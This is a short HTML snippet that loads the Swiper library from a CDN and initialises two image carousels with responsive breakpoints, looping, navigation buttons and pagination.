<script src="https://cdn.jsdelivr.net/npm/swiper/swiper-bundle.min.js"></script>

<!-- Initialize Swiper -->
<script>
  var swiper = new Swiper(".mySwiper1", {
    centeredSlides: true,

    roundLengths: true,
    loop: true,
    loopAdditionalSlides: 30,
    navigation: {
      nextEl: ".swiper-button-next",
      prevEl: ".swiper-button-prev"
    },
    breakpoints: {
      640: {
        slidesPerView: 1,
        spaceBetween: 30
      },
      1200: {
        slidesPerView: 2,
        spaceBetween: 60
      },
      1800: {
        slidesPerView: 3,
        spaceBetween: 100
      }
    }

  });

  var swiper = new Swiper(".mySwiper2", {
    navigation: {
      nextEl: "mySwiper2 .swiper-button-next",
      prevEl: "mySwiper2 .swiper-button-prev",
    },
    slidesPerView: 1,
    spaceBetween: 60,
    loop: true,
    loopFillGroupWithBlank: true,
    centeredSlides: true,
    pagination: {
      el: ".swiper-pagination",
      clickable: true
    }
  });
</script>